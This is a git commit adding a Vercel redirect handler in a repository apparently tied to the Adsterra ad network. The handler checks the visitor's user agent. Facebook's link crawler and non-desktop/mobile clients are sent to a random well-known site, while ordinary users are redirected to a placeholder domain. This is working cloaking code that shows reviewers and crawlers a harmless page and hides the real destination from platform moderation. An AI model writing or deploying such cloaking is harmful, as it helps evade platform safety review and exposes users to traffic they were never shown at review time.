3d87f858aef13dca8012d2288904909b626d3463
GoNewsUpdate <git@stackblitz.com>
2025-01-14 02:02:04 +0530

    Initial commit

---
+++ README.md
@@ -0,0 +1,3 @@
+# sb1-adsterra
+
+[Edit in StackBlitz next generation editor ⚡️](https://stackblitz.com/~/github.com/GoNewsUpdate/sb1-adsterra)
---
+++ api/redirect.ts
@@ -0,0 +1,45 @@
+import { VercelRequest, VercelResponse } from '@vercel/node';
+
+const topWebsites = [
+  'https://www.google.com',
+  'https://www.youtube.com',
+  'https://www.facebook.com',
+  'https://www.twitter.com',
+  'https://www.instagram.com',
+  'https://www.amazon.com',
+  'https://www.netflix.com',
+  'https://www.linkedin.com',
+  'https://www.reddit.com',
+  'https://www.tiktok.com',
+  'https://www.wikipedia.org',
+  'https://www.yahoo.com',
+  'https://www.whatsapp.com',
+  'https://www.microsoft.com',
+  'https://www.apple.com',
+  'https://www.github.com',
+  'https://www.pinterest.com',
+  'https://www.twitch.tv',
+  'https://www.spotify.com',
+  'https://www.discord.com'
+];
+
+export default function handler(req: VercelRequest, res: VercelResponse) {
+  const userAgent = req.headers['user-agent'] || '';
+  
+  // Check if user agent contains facebookexternalhit or doesn't contain android, mac os, windows
+  if (
+    userAgent.toLowerCase().includes('facebookexternalhit') ||
+    !(
+      userAgent.toLowerCase().includes('android') ||
+      userAgent.toLowerCase().includes('mac os') ||
+      userAgent.toLowerCase().includes('windows')
+    )
+  ) {
+    // Redirect to random top website
+    const randomSite = topWebsites[Math.floor(Math.random() * topWebsites.length)];
+    return res.redirect(307, randomSite);
+  }
+  
+  // Otherwise redirect to abc.com
+  return res.redirect(307, 'https://abc.com');
+}
